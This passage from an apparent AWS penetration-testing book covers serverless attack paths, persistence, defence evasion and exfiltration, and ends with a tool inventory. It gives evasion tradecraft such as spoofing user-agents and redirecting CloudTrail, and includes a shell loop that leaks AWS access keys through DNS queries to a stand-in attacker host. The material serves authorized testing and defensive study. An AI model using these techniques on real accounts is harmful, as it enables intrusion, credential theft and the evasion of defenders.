GuardDuty EKS Protection (runtime monitoring) and GuardDuty ECS Runtime Monitoring are the two platform-level container detections. They catch process-level anomalies (a shell opening in a container that does not usually have one; a curl to a metadata endpoint that does not usually make one). Coverage is good, in our experience, but false-positive rates are high enough that signal-to-noise often degrades in mature deployments, and many teams have runtime monitoring turned off after initial evaluation. Kubernetes audit logs in EKS (sent to CloudWatch Logs) capture every API call but require parsing and a detection layer that very few organizations have.

Key takeaways

  • ECS task metadata at 169.254.170.2 has no PUT-token protection; SSRF-to-credential in an ECS container is easier than on modern EC2.
  • ECS-on-EC2 containers can often reach host IMDS and escalate to the instance profile unless ECS_AWSVPC_BLOCK_IMDS is set.
  • EKS IRSA tokens and Pod Identity credentials are available directly inside the pod; RCE in the pod yields them.
  • The aws-auth ConfigMap (or the newer eks:AssociateAccessPolicy) is the IAM-to-Kubernetes admin bridge; either path grants cluster-admin.
  • ECR image-pull poisoning is a quiet supply-chain primitive; scanning does not block pull.

Chapter 14
Serverless and Event-Driven Architectures

Serverless and event-driven architectures — API Gateway in front of Lambda, EventBridge between services, SNS and SQS, Step Functions orchestrating business logic — expose surface area that looks small because no VMs run. It isn't. Each component has an IAM surface, each has a resource policy surface, and each connects to the others through event patterns that can be subverted as persistence or privilege-escalation primitives. This chapter treats the five canonical event-driven services — API Gateway, EventBridge, SNS, SQS, and Step Functions — with emphasis on the event-pattern subversion class of attacks, which have become dominant in mature cloud environments.

14.1  API Gateway: authorization and the IAM proxy

API Gateway sits in front of Lambda or an HTTP backend. Its authorization is one of: none (open), API key, IAM (SigV4), Lambda authorizer, Cognito user pools, or OIDC (HTTP APIs). The attack surface depends on which mode is configured. The common weakness is Lambda authorizers that return a cached Allow verdict for too-broad resource patterns. The authorizer's response is a policy document; if it returns Effect: Allow on arn:aws:execute-api:*:*:*/*/*/* (which many authorizers do to "simplify caching"), every path on every method is authorized for any requester who satisfies the authorizer's minimum check, for the duration of the cache window.

A related API Gateway weakness is the AWS_IAM authorization mode combined with a resource policy that is overly permissive. If the API's resource policy allows * principal, any AWS user in any account can SigV4-sign a request to the API. This is almost never what the organization intended; it is usually the result of copy-pasting from a tutorial.

14.2  EventBridge: the attack that looks like plumbing

EventBridge is the default event router in modern AWS stacks. A rule matches events on an event bus and sends them to one or more targets (Lambda, SNS, SQS, Step Functions, API destinations, other buses). The attacker-relevant primitives are:

PutRule + PutTargets. Creates a new rule that matches a pattern — for example, every CloudTrail API event for a specific identity — and sends the events to an attacker-controlled target. This is the CloudTrail-watching-through-EventBridge primitive: the attacker does not need cloudtrail:LookupEvents; they just subscribe to the live event stream.

Cross-account event buses. EventBridge event buses have resource policies. An attacker with events:PutPermission can grant their own account the right to send events into the target bus, which is useful for poisoning downstream workflows. Conversely, events:PutTargets with a target in another account (supported since 2021) allows the attacker to ship events out of the target account on a schedule.

Schedulers. The EventBridge Scheduler service — distinct from event buses — runs schedules that invoke targets. A scheduled target that invokes a Lambda runs the Lambda under its execution role; if the attacker can create a schedule that invokes a sensitive Lambda, they have persistent invocation regardless of whether they can directly call lambda:InvokeFunction.

Figure 14.1 — EventBridge persistence: the attacker's rule subscribes to high-value events and forwards them to a target under the attacker's control, surviving credential rotation in the victim's account.

14.3  SNS and SQS resource-policy surface

SNS topics and SQS queues have resource policies. An attacker with sns:SetTopicAttributes or sqs:SetQueueAttributes (or the AddPermission variants) can grant their own account send, receive, or subscribe permissions. The critical angle is subscription: if an attacker subscribes their HTTPS endpoint to an SNS topic that carries sensitive events (for example, a customer-notification topic, or a monitoring topic that contains transaction data), they get every message in real time. SQS is similar: granting ReceiveMessage to an external account lets the attacker drain the queue from their side, potentially before the legitimate consumer has processed the message. This is a subtle class of data loss that resembles a bug rather than an attack.

14.4  Step Functions and the state-machine pivot

Step Functions orchestrate calls to other AWS services. Each state machine has an execution role. The attack primitives are: states:CreateStateMachine with a role that the attacker can iam:PassRole on, states:UpdateStateMachine to change an existing state machine's definition to inject attacker-owned states, and states:StartExecution to run it. A state machine whose definition includes a Task state invoking arn:aws:states:::sts:assumeRole or an AWS SDK integration performing sensitive operations runs those operations under the state machine's execution role. This is lambda:UpdateFunctionCode's cousin, at the workflow level.

14.5  The S3-notification persistence primitive

Chapter 8 introduced s3:PutBucketNotification as a privilege-escalation primitive. It is equally a persistence primitive. A notification that fires a Lambda on every PutObject to a target bucket gives the attacker continuous execution whenever data lands in the bucket — which may be many times per minute in a busy lake. If the Lambda's code is under attacker control and the bucket is heavily written, this is the closest AWS has to a persistent cron in production environments.

attacker@kali:~$ cat notification.json <<EOF
{
  "LambdaFunctionConfigurations": [{
    "LambdaFunctionArn": "arn:aws:lambda:us-east-1:111122223333:function:metrics-processor",
    "Events": ["s3:ObjectCreated:*"],
    "Id": "metrics-v2"
  }]
}
EOF
attacker@kali:~$ aws s3api put-bucket-notification-configuration \
    --bucket prod-events --notification-configuration file://notification.json
# the Lambda pointed to is one the attacker previously modified with lambda:UpdateFunctionCode

14.6  Event-pattern subversion: what the defender misses

EventBridge event patterns can be arbitrarily narrow. An attacker rule with a pattern such as { "source": ["aws.iam"], "detail": { "userIdentity": { "principalId": ["AIDA*victim_id*"] } } } matches only events involving a specific user — it is virtually invisible in volume metrics, and it costs effectively nothing. The pattern can be constructed to match just CloudTrail events that indicate the organization is investigating the attacker's presence (for example, events.name starting with GetCallerIdentity from responder-pattern SourceIPs), giving the attacker a silent early-warning system.

Operator note: region sprawl

EventBridge rules are region-scoped. A rule in me-central-1 is not visible to a defender's queries against us-east-1. Organizations that do not operate in every AWS region rarely have detection coverage in those regions. If your persistence rule has to live somewhere, pick a region where the organization has zero workloads but does not block with an SCP.

14.7  Serverless-plane detections

API Gateway access logs (not on by default), CloudWatch Logs metric filters on Lambda invocations, and SNS/SQS/EventBridge CloudTrail management events are the native signals. GuardDuty's cloud coverage includes Discovery:S3/AnomalousBehavior but has no direct EventBridge detection class as of 2025. Tools like CloudSplaining and Prowler can audit for overly broad resource policies on these services after the fact; they do not detect active abuse.

Key takeaways

  • Lambda authorizer caching and API Gateway AWS_IAM-with-wildcard resource policies are the two most common authorization flaws.
  • EventBridge rules are a persistence primitive: an attacker can subscribe to live CloudTrail events without any cloudtrail:* permission, and cross-region deployment evades regional detection gaps.
  • SNS and SQS resource-policy writes (SetTopicAttributes, AddPermission) allow external subscription and quiet message drain.
  • Step Functions state-machine updates inject attacker-controlled states under the existing execution role, equivalent in impact to Lambda code replacement.
  • S3 bucket notifications combined with attacker-modified Lambda code produce a persistent-execution primitive scaled to bucket write volume.

Part V

Post-Exploitation

Once the operator has achieved a foothold and enumerated the IAM landscape, the engagement turns to the post-exploitation phase: stay resident long enough to complete the mission, avoid detection while doing so, and move data out of the environment in a way that is operationally robust against investigation. Part V covers the three phases the way MITRE ATT&CK for Cloud describes them — persistence (TA0003), defense evasion (TA0005), and exfiltration plus impact (TA0010 / TA0040) — but with the specific flavour AWS imposes: persistence in AWS is rarely about implants on disk because there is no disk the operator meaningfully controls; it is about creating or modifying control-plane objects that survive credential rotation. Evasion in AWS is rarely about process hiding because there are no processes the operator owns; it is about choosing CloudTrail-friendly identities, blending with automation, and disabling or diverting log streams. Exfiltration in AWS is rarely about network tunnels because the data plane is already service-to-service; it is about service-side primitives that move data without crossing the defender's network perimeter at all.

Chapter 15
Persistence

MITRE ATT&CK catalogues nearly twenty cloud persistence techniques; most of them collapse, in AWS, to one of three families. First, identity persistence: create or modify a principal — an IAM user, an access key, a role, a federation trust — that the attacker can use again later. Second, compute persistence: create or modify an execution context — a Lambda function, an EventBridge rule, an EC2 user-data script, a launch template — that runs attacker code on a schedule or in response to an event. Third, configuration persistence: create or modify a global account setting — AWS SSO permission sets, Identity Center instance, Organizations SCP, service-level trusts — that broadens the attacker's access in a way a routine credential rotation does not close. This chapter walks each family with the trade-offs among them.

15.1  Identity persistence: users, keys, and MFA

The simplest persistence primitive is iam:CreateUser + iam:CreateAccessKey + iam:AttachUserPolicy. It leaves a CloudTrail trail the size of a highway marker — three events, all on iam.amazonaws.com, all with an obvious username — and it is trivial for a defender to detect if they have any IAM-change alerting. The improved version: use a username that matches an existing pattern (svc-, ci-, ghactions-) and attach the user to an existing group rather than creating a new policy. The most improved version: do not create a new user at all; instead, add an access key to an existing service user. iam:CreateAccessKey on a service user produces a CloudTrail event that almost nobody alerts on, because service users rotate their keys as part of normal operations.

If the attacker can create or modify an IAM user's console login profile, they can also add MFA. AWS issues virtual MFA devices through iam:CreateVirtualMFADevice + iam:EnableMFADevice. A legitimate-looking username with MFA enabled is nearly indistinguishable from a real employee account; the presence of MFA defeats the IAM user without MFA compliance audits that some organizations use as a blanket persistence detector.

Role-based persistence is superior for two reasons. First, roles do not have long-lived access keys, so rotation is not a path to eviction. Second, roles are assumed by many principals legitimately, so adding an attacker-controlled principal to a role's trust policy (iam:UpdateAssumeRolePolicy) is less visible than creating a new user. The attacker's target in this pattern is an existing role that the organization uses frequently; the trust modification is an additional principal in the AWS or Federated block, often with an ExternalId condition that makes it look like a vendor integration.

15.2  Federation-trust abuse: OIDC and SAML

A higher-leverage identity-persistence technique is to establish or subvert a federated identity provider. Two subfamilies matter.

Cognito identity pools. An attacker who can modify a Cognito identity pool's authentication configuration (cognito-identity:UpdateIdentityPool, cognito-identity:SetIdentityPoolRoles) can point the pool's unauthenticated role at a more privileged IAM role, and then assume that role via cognito-identity:GetId + cognito-identity:GetCredentialsForIdentity from any anonymous client on the internet. This produces a fully anonymous entry point that bypasses MFA, password rotation, and conditional-access policies.

GitHub OIDC and similar. Organizations frequently have an OIDC provider configured for token.actions.githubusercontent.com so that GitHub Actions workflows can assume AWS roles. If the attacker can either (a) modify the trust policy of such a role to broaden the sub pattern (for example, from repo:MyOrg/MyRepo:ref:refs/heads/main to repo:MyOrg/*), or (b) add a new OIDC provider pointing at an attacker-controlled identity-provider endpoint, they have remote, keyless persistence. The second sub-variant is a near-invisible backdoor because most defenders never enumerate the OIDC provider list.

attacker@kali:~$ # enumerate existing OIDC providers
attacker@kali:~$ aws iam list-open-id-connect-providers

attacker@kali:~$ cloudfox aws role-trusts --profile attacker --filter-oidc

15.3  Compute persistence: Lambda, EventBridge, Launch Templates

Compute persistence is about running attacker code on a trigger that the attacker does not have to initiate. The canonical persistence pair in AWS is an EventBridge rule that matches a broad event (for example, rate(1 hour), or every ConsoleLogin) and a Lambda target that executes attacker-controlled code. Because the Lambda's execution role can be a widely-scoped role already in the organization, the persistence footprint is: one rule, one target pointer, one benign-looking IAM policy. There is no Lambda function created if the attacker reuses one that already exists (per lambda:UpdateFunctionCode in Chapter 10).

Launch templates are a persistence primitive for EC2 fleets: an attacker who can ec2:CreateLaunchTemplateVersion and make that version the default sets the user-data script, AMI, or instance-profile for every future instance launched from the template. Organizations that use Auto Scaling groups refreshed on a nightly basis will see attacker code running on every instance after the next refresh, with the attacker's chosen instance profile.

Operator note: AMI persistence

An alternative launch-template persistence is to create a new AMI (via ec2:CreateImage) that contains an attacker-controlled cloud-init hook, and swap the launch template to use it. The AMI is a full VM image; the attacker can bake in a systemd service that reaches out to a C2 channel. This is the closest AWS gets to traditional disk-based persistence, and it survives a rebuild of the environment's Terraform if the Terraform reads the AMI id from a data source like aws_ami_ids that matches the attacker's tag pattern.

15.4  Configuration persistence: Identity Center, Organizations, SCPs

Configuration persistence is the highest-leverage family and the hardest to detect. Four patterns matter.

Identity Center (formerly AWS SSO) permission sets. An attacker who can sso-admin:CreatePermissionSet, sso-admin:PutInlinePolicyToPermissionSet, and sso-admin:CreateAccountAssignment can grant themselves (or a user they control) access to every account in the Organization via a single permission-set assignment. Because Identity Center is a root-level service, the footprint lives outside every individual account; a target-account compromise investigation will not find it.

Organizations SCPs. Removing an SCP (organizations:DetachPolicy, organizations:DeletePolicy) can silently lift restrictions that the operator would otherwise hit. The SCP history is not easily queryable in the console; the CloudTrail event in the management account is the only record, and many organizations do not monitor management-account CloudTrail with the same rigor as workload accounts.

Service-level trusts. Adding a new trusted service to AWS Security Hub, GuardDuty, or Config (via organizations:EnableAWSServiceAccess) or modifying the designated administrator account for a service (organizations:RegisterDelegatedAdministrator) can subtly broaden the attacker's authority. A delegated administrator of GuardDuty in a single-account context means the attacker can disable GuardDuty's own findings.

Account-level defaults. s3:PutBucketPublicAccessBlock at account level, ec2:ModifyEbsDefaultKmsKeyId, iam:SetDefaultPolicyVersion on customer-managed policies — each of these is a persistence primitive in the sense that it changes what future objects look like.

Chapter 16
Defense Evasion

CloudTrail is the defender's primary narrative source. Every evasion technique in this chapter therefore orbits around the same question: what ends up in CloudTrail, and can the attacker bend that record? This chapter covers four evasion classes, ordered by the operational risk they carry. The lowest-risk class is blending: act with the identities, the regions, the volumes, and the timing the defender already expects. The mid-risk class is narrowing the log: choose identities and actions that produce minimal or benign CloudTrail entries. The high-risk class is diverting or disabling the log: redirect CloudTrail output to an attacker-controlled destination, stop trails, or disable services. The class at the high end of risk should be considered only when the alternative is mission failure — disabling CloudTrail is the most reliable way to tell a defender that they are under attack.

16.1  Blending with automation

Most AWS environments execute far more API calls per day from automation identities (CI roles, Terraform roles, scheduler Lambdas) than from human identities. That ratio is the operator's friend. If you are acting from a role whose CloudTrail baseline is thousands of calls per day across dozens of services, your additional calls are a rounding error. If you are acting from a human user that logs in once a week and runs four API calls, your presence is visible in absolute terms even before any anomaly model runs.

The first evasion posture is therefore act from roles, not users, and among roles, pick the ones with the broadest normal behaviour. Terraform roles, deploy roles, and data-platform service roles are the archetypes. A good operator spends the time to read the role's recent usage — in CloudTrail Insights, in Access Analyzer, in the role's LastUsed fields in IAM — and matches their activity to the role's existing footprint, not just in volume but also in region and service mix.

16.2  User-agent and source-IP controls

Every CloudTrail record includes the user-agent string and the source IP of the API caller. These two fields are often filtered in defensive queries: human calls come from the office ranges and use aws-cli or a web browser; automation calls come from known CI ranges and use specific SDKs. An operator should ensure their calls match the expected pattern. The most common mistakes are (a) using the default aws-cli from an attacker workstation when the role's normal caller is a container using aws-sdk-go-v2 from an AWS IP, and (b) using a home IP when the role's normal caller is an Azure-hosted CI runner. The AWS SDKs allow setting the user-agent via environment variable (AWS_EXECUTION_ENV); most operators forget this.

attacker@kali:~$ # match a Terraform-like user-agent
attacker@kali:~$ export AWS_EXECUTION_ENV="APN/1.0 HashiCorp/1.0 Terraform/1.5.7"
attacker@kali:~$ aws sts get-caller-identity
{ "Account": "111122223333", "Arn": "arn:aws:sts::111122223333:assumed-role/terraform-deploy/op-12345" }

Source-IP control is harder. One operational pattern is to pivot calls through a compromised EC2 instance inside the target account (so the source IP is an AWS-internal address) or through a VPC endpoint (so the call never leaves the private network). Both are bandwidth-constrained and latency-heavy but they are the most realistic way to match an automation role's IP pattern.

16.3  Session names and SourceIdentity

When you assume a role, the RoleSessionName is attacker-controlled and appears in CloudTrail's userIdentity.arn field as assumed-role/<role>/<session-name>. A session name of ci-build-42117 is invisible; a session name of pwned-session-1 is self-reporting. More advanced: some roles are configured with sts:SourceIdentity conditions on their trust policies, which propagate a caller-asserted identity through chained AssumeRole calls. Setting SourceIdentity to a value that matches the organization's build system identity pattern (for example, github-actions/MyOrg/MyRepo/run-12345) makes chain-wide attribution uniformly consistent with the legitimate caller.

16.4  Regional arbitrage and log routing

CloudTrail can be regional or multi-region. Most organizations configure a multi-region trail in a central region; the rest have single-region trails per region. If the organization has not enabled a region, CloudTrail there records only global service events (IAM, STS) and not regional events. An attacker who operates only in an unused region — me-central-1, ap-southeast-3, af-south-1 — may still produce a CloudTrail entry (because the global trail catches STS) but will not produce regional data events, S3 data events, or Lambda data events for that region. For short-lived operations in obscure regions, this is real reduction.

16.5  Narrowing the log with unlogged actions

A small but operationally useful set of AWS API calls are not logged in CloudTrail by default. STS GetCallerIdentity used to be unlogged for principals with no temporary credentials; as of March 2024 it is logged in all cases. S3 list calls against a bucket are management events and are logged; S3 GetObject is a data event and is logged only if data-event logging is enabled on the trail. KMS Decrypt, Encrypt, and GenerateDataKey are logged as management events but are so numerous in a normal account that they are rarely alerted on. DynamoDB item-level API calls are data events, off by default.

The attacker's move is to prefer, when available, actions that land in the data-event bucket rather than the management-event bucket, because data events are much more likely to be unlogged in a given organization. For example, reading a secret via secretsmanager:GetSecretValue is a management event; reading the same secret's contents after sts:AssumeRole-ing to a role that already has it in an environment variable produces no management event.

16.6  Disabling and diverting CloudTrail

There are three classes of high-risk evasion: stopping the trail, redirecting the trail, and disabling downstream services (GuardDuty, Config, Security Hub).

Stopping the trail. cloudtrail:StopLogging halts the specified trail. Every mature detection pipeline alerts on this event loudly; GuardDuty generates Stealth:IAMUser/CloudTrailLoggingDisabled; Config has a managed rule for it. Do not do this on an engagement whose goal is to persist.

Redirecting the trail. cloudtrail:PutEventSelectors can narrow which management events are captured; cloudtrail:UpdateTrail can change the destination S3 bucket or Logs group. If the attacker changes the destination to a bucket in an attacker account (and the bucket policy allows CloudTrail writes), the trail continues to work from the defender's point of view until somebody checks the configuration. This is a middle-risk primitive: it preserves CloudTrail's apparent liveness but gives the attacker read-only control over what the defender sees going forward. The defender's detection here is CloudTrail's Insights feature and the Config rule cloudtrail-s3-dataevents-enabled.

Disabling downstream services. guardduty:DeleteDetector, guardduty:UpdateDetector --disable, config:DeleteConfigurationRecorder, securityhub:DisableSecurityHub — each of these terminates a detection service in the region. Each produces an alert of its own in most mature organizations; they are triangulation indicators of compromise. Only use these when you have already achieved the mission objective and need to slow the response.

Warning: what AWS Detective sees

AWS Detective retains CloudTrail and VPC Flow Logs data independently of the customer's trails for a rolling 365-day window. Even if you stop or redirect CloudTrail in the victim account, Detective still has a copy — and a responder who pulls Detective on the affected role gets a forensically complete trail. The only way to deny Detective its data is to have never generated the event in the first place. This is the strongest argument for blending over log tampering.

16.7  GuardDuty specifics

GuardDuty's 2025 finding taxonomy includes five dozen distinct finding types across IAM, EC2, EKS, S3, and Lambda. Knowing which ones fire on which operator behaviours is valuable. The ones most likely to fire on a novice operator are UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS (covered earlier), Stealth:IAMUser/CloudTrailLoggingDisabled, Recon:IAMUser/MaliciousIPCaller (calls from a known bad IP per the GuardDuty threat intel feed), and Impact:IAMUser/AnomalousBehavior (behavioural anomalies per the GuardDuty model). The threat-intel-driven finding in particular is under-appreciated: a call from a known Tor exit, a known bulletproof host, or a known C2 IP produces an immediate high-severity finding, and operator infrastructure must avoid these lists.

16.8  Access Analyzer as a counter-evasion risk

Access Analyzer produces findings when a resource is shared with a principal outside the defined zone of trust (account, Organization, or Organization Unit). If the attacker shares a resource with an external account — the EBS snapshot sharing in Chapter 11, the ECR repository policy in Chapter 13 — Access Analyzer may produce a finding within minutes. The operator's mitigation is to choose targets that already have external-sharing patterns (snapshot-sharing is common in backup architectures; ECR cross-account is common in multi-account CI) so the new finding is not a new category but rather a new item in an already-reviewed category.

Key takeaways

  • CloudTrail is the defender's narrative source; every evasion technique orbits it.
  • The lowest-risk evasion is blending: act from high-volume roles, match region/service/volume/user-agent patterns, use automation-like session names.
  • Mid-risk evasion is narrowing: prefer actions that are unlogged by default, operate in regions without regional trails, avoid verbose management events.
  • High-risk evasion (stopping trails, redirecting trails, disabling GuardDuty) produces loud detections and should be reserved for end-of-mission scenarios.
  • AWS Detective retains CloudTrail data independently of the customer's trails; log tampering does not erase the forensic record.

Chapter 17
Data Exfiltration and Impact

Exfiltration is the phase where the operator converts access into the artifact the engagement exists to produce: a demonstration of customer-data egress, a demonstration of cryptographic key theft, a demonstration of financial control. Impact is the parallel phase where the operator (with client authorization) demonstrates destructive capability: encryption of data, deletion of snapshots, account lockout. This chapter covers both under the same umbrella because they share a requirement that distinguishes them from the recon and escalation phases: defensibility. Exfiltration and impact actions are the ones most likely to attract forensic scrutiny, and the operator must be able to demonstrate, after the fact, exactly which actions were taken and which were not. The operational discipline here is not about being quieter; it is about being documented.

17.1  Exfiltration categories

AWS exfiltration primitives fall into three buckets. Service-side primitives move data entirely inside AWS — EBS snapshot sharing (Chapter 11), S3 replication, RDS snapshot sharing, DynamoDB export, Redshift UNLOAD, Athena CTAS. Service-to-internet primitives move data from an AWS service to an attacker-controlled internet endpoint — Lambda with urllib.request, EC2 with curl, SNS HTTPS subscriptions to attacker endpoints, EventBridge API destinations. Out-of-band primitives move data through channels AWS does not directly mediate — a shared document that later gets forwarded, a credential printed to CloudTrail and read by a downstream log aggregator, a DNS query that embeds data in the subdomain.

In terms of detection visibility, service-side is the quietest (the data stays on AWS's plane), service-to-internet is the loudest (VPC Flow Logs, GuardDuty's data-exfil anomaly detection), and out-of-band is the most unpredictable. Mature operators prefer service-side for bulk and service-to-internet only for small high-value pulls.

17.2  Secrets and the KMS data-key pattern

Secrets Manager and SSM Parameter Store are the two services where the operator most frequently finds credentials worth exfiltrating. Both are encrypted with KMS keys, and both produce CloudTrail events on read: secretsmanager:GetSecretValue and ssm:GetParameter with decrypt=true. The events are high-severity in many detection pipelines because secret reads are rare in well-tooled organizations. The operator's two countermeasures: bulk reads look exactly like a bad pattern, so target specific secrets rather than iterating through all of them; and, when possible, use a role that routinely reads the secrets in question — the application's own role is the best cover.

A related primitive is KMS data-key re-encryption. If the attacker holds kms:Decrypt on a key and kms:Encrypt on a key they control, they can decrypt data encrypted with the target key and re-encrypt it with their own key, producing an attacker-readable ciphertext that can then be exfiltrated like any other blob. This matters for envelope-encrypted objects (S3 SSE-KMS, Secrets Manager, many application-layer encryption schemes).

17.3  DNS exfiltration from inside AWS

VPC Flow Logs capture L3/L4 metadata but not payload content. DNS queries from AWS VPCs pass through Route 53 Resolver, which does not log queries to CloudTrail by default — Route 53 Resolver Query Logging is a separate feature that must be enabled. Absent that, an attacker inside a VPC can encode small amounts of data (credentials, short files, hashes) in DNS subdomain labels and query an attacker-controlled authoritative DNS server. The bandwidth is terrible (tens of kilobytes per minute in practice) but the detection footprint is almost nil in organizations without Query Logging enabled.

attacker@ec2-in-victim:~$ # encode a credential into DNS query labels
attacker@ec2-in-victim:~$ CRED=$(base32 <<< "$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY")
attacker@ec2-in-victim:~$ for i in $(seq 0 63 ${#CRED}); do
    CHUNK=${CRED:$i:63}
    dig +short ${CHUNK}.exf.attacker.example.com A > /dev/null
done

17.4  The large-bulk exfil playbook

When the target is a multi-terabyte data set (a Redshift warehouse, a data-lake S3 prefix, an Aurora cluster), the bandwidth-free option is almost always a service-side primitive. Redshift UNLOAD to an attacker S3 bucket; Athena CTAS to an external table; S3 cross-account replication; EBS snapshot sharing. The only consideration is destination accessibility: does the attacker have an AWS account whose S3 bucket can receive writes from the target's IAM role? This is where pre-engagement infrastructure matters. An attacker who has stood up, ahead of the engagement, an AWS account with appropriate bucket policies and KMS key policies can complete the exfil in minutes; an attacker who starts building that infrastructure mid-engagement is building it while under observation.

17.5  Impact primitives (authorized only)

Impact demonstrations must be explicitly scoped in the rules of engagement. The canonical impact primitives in AWS are:

Data encryption / ransomware. Using a customer-controlled KMS key to re-encrypt S3 objects, RDS snapshots, or EBS snapshots such that the victim cannot read them without the attacker's cooperation. s3:PutObject with --server-side-encryption aws:kms --ssekms-key-id <attacker-key>, or copying snapshots to a new KMS key and deleting the originals, are the canonical patterns. The Scattered Spider / UNC3944 intrusions of 2023-2024 publicized this class against Okta-adjacent AWS environments.

Snapshot and backup deletion. ec2:DeleteSnapshot, rds:DeleteDBSnapshot, backup:DeleteRecoveryPoint. This is destructive and irreversible.

Root account lockout. Changing the root account's email address (requires root credentials, rarely achievable), or disabling MFA on the root and changing the password — both are reported to the defender through billing alerts and should be excluded from most engagements.

Account suspension. organizations:CloseAccount closes a member account in an Organization. The account cannot be re-opened by the customer alone; AWS Support intervention is required.

Warning: authorization scope

Impact primitives — especially DeleteDBSnapshot, DeleteSnapshot, CloseAccount, and bulk KMS re-encryption — must be explicitly authorized in writing in the rules of engagement. Even with authorization, the authors' practice is to use a designated demonstration bucket / instance / snapshot rather than exercise the primitive against production objects. A client who asks for "prove you could ransomware us" can be satisfied by demonstrating the primitive against a small dataset the operator has been given permission to encrypt; they should not be satisfied by discovering their production data encrypted at 3am.

17.6  Exfiltration evidence trail

From a report-writing perspective, every exfiltration step must produce verifiable evidence: the CloudTrail event id, the service-side artifact (snapshot id, export task id), the destination (bucket name, object keys), and a hash of any data moved. The operator should record these continuously during the engagement, not reconstruct them afterwards. A single-file evidence.jsonl that each operational script appends to — one line per material action, with a timestamp, an action type, the target ARN, and a human description — is the minimum discipline. The final report (Chapter 20) reads this file to produce the timeline.

17.7  MITRE ATT&CK alignment

Exfiltration maps to ATT&CK TA0010 with two cloud sub-techniques worth calling out explicitly: Transfer Data to Cloud Account (T1537), which covers every service-side primitive; and Exfiltration Over Web Service (T1567), which covers Lambda-to-internet and DNS-based channels. Impact maps to TA0040 with Data Destruction (T1485), Data Encrypted for Impact (T1486), Account Access Removal (T1531), and Resource Hijacking (T1496) as the most common sub-techniques. Mapping findings explicitly to ATT&CK sub-technique IDs in the report makes them easier for the defender's detection team to integrate into their ATT&CK-aligned coverage tracking.

Key takeaways

  • Exfiltration primitives are either service-side (quietest), service-to-internet (loudest), or out-of-band (most variable); prefer service-side for bulk.
  • Secrets Manager and Parameter Store reads are high-severity events in mature pipelines; target specific secrets and operate from the secret's normal consumer role.
  • DNS exfiltration from inside a VPC remains viable because Route 53 Resolver Query Logging is off by default in most organizations.
  • Large-bulk exfiltration through service-side primitives requires pre-staged destination infrastructure; build it before the engagement, not during.
  • Impact primitives must be explicitly authorized and demonstrated against scoped demonstration objects, not production objects.
  • Continuous evidence capture (evidence.jsonl) during the engagement is the minimum discipline for a defensible report.

Chapter 18
The Operator's Toolbox

A mature AWS engagement uses a small number of tools intensively rather than a large number of tools superficially. This chapter inventories the tools referenced throughout the book, plus a handful not yet introduced, and describes when each one earns a place on the engagement laptop. The lineup evolves year by year; the categorization below reflects the landscape as of 2026.

18.1  Enumeration and reconnaissance

CloudFox. A Bishop Fox project. For the practicing operator, CloudFox is the highest-leverage single tool on the engagement. Its subcommands collapse what would otherwise be dozens of individual AWS API calls into operator-useful summaries: inventory, endpoints, role-trusts, permissions, secrets, iam-simulator, outbound-assumed-roles. The output is text, grep-able, and designed to be read by humans rather than exported to a BI tool. If only one enumeration tool is installed, it should be CloudFox.

Pacu. A Rhino Security Labs project. Pacu is less a reconnaissance tool than a framework: a Python shell with modules for enumeration, privilege escalation, and exploitation. Its iam__privesc_scan module automates the 30+ privilege-escalation primitives from Chapter 8; its iam__enum_permissions module produces a more exhaustive permission map than brute-force aws iam simulate-principal-policy calls. Pacu is at its best on long-running engagements where the operator returns to the shell repeatedly over days.

ScoutSuite. A NCC Group project. ScoutSuite produces HTML-rendered compliance-style audit reports from a read-only scan of an AWS account. In an offensive context, it is most useful as a misconfiguration backlog generator: run it, ingest the findings, and cross-reference with your own exploitation hypotheses. Its S3 bucket policy analysis and IAM policy analysis modules are particularly useful.

Prowler. A CIS-benchmark / AWS-Foundational-Security-Best-Practices driven audit tool; open-source (originally by Toni de la Fuente). Prowler's offensive-value is its broad coverage of compliance misconfigurations that correlate with exploitable conditions — public S3, open security groups, unrotated keys, overly-permissive resource policies. Prowler's 3.x / 4.x branches accept custom checks written in Python.

PMapper (Principal Mapper). A NCC Group project. PMapper builds a graph of IAM principals and edges (what-can-assume-what, what-can-escalate-to-what) and lets the operator query it with Gremlin-like queries. Can user Alice reach role BuildAdmin? is a PMapper query, and the answer includes the path. PMapper is indispensable for complex IAM environments where the raw policy text is no longer human-readable.

18.2  Secret hunting and credential discovery

TruffleHog. The canonical Git-secret scanner; v3.x added AWS-specific detectors and a live-verification mode that tests each candidate credential against sts:GetCallerIdentity before reporting. Live verification reduces false-positive volume dramatically and is worth enabling on every run.

Gitleaks. A secondary option. Its ruleset is competitive with TruffleHog's and it is slightly faster on very large repositories; it does not verify credentials against AWS.

Noseyparker. A third option, with a unique architecture: it builds a persistent content-addressable store of scanned blobs, which makes repeat scans across the engagement much faster. Appropriate for organizations with dozens of large repositories.

s3enum / S3Scanner. Two tools for unauthenticated S3 bucket discovery; useful pre-engagement to produce a candidate list of bucket names for an organization before any credentials are held.

quiet-riot. A lightweight role-name brute-forcer. Queries sts:AssumeRole with candidate role ARNs and observes the error code to distinguish existing-role from no-such-role. Good for IAM enumeration when only a limited set of credentials is held.

18.3  Exploitation and post-exploitation

aws-vault. Credential manager with IAM role support. Not an attack tool, but its ability to scope, chain, and cache STS credentials makes it a better operational wrapper around aws than shell environment variables. Every example in this book is easier to operate out of aws-vault exec.

Stratus Red Team. A Datadog project. Stratus is a simulator: it executes red-team techniques against a target AWS account to produce the telemetry the defender would need to detect the technique. In an offensive context, Stratus's value is reversed: it is a catalogue of CloudTrail signatures for common attacks, which the operator can study to understand how their planned actions will look to a detection engineer.

CloudGoat / IAM Vulnerable / AWSGoat / TerraGoat. Four open-source vulnerable-by-design AWS labs covering, respectively, Pacu-tuned scenarios, IAM primitives, multi-service exploitation paths, and Terraform misconfigurations. These are the industry standard for practice; every chapter in this book has at least one exercise that can be reproduced in one or more of them.

enumerate-iam. Offers a "brute-force enumerate" mode that iterates through a list of AWS API actions and tests each with dry-run or equivalent. It produces an exhaustive permission map from minimal starting credentials, though at the cost of a very noisy CloudTrail trail (thousands of events).

Leonidas. A FSecure project. Leonidas is a Python framework for AWS-attack simulation with a large built-in library of techniques, each annotated with CloudTrail signatures. Comparable to Stratus Red Team but with different technique coverage.

18.5  Building an operator's harness

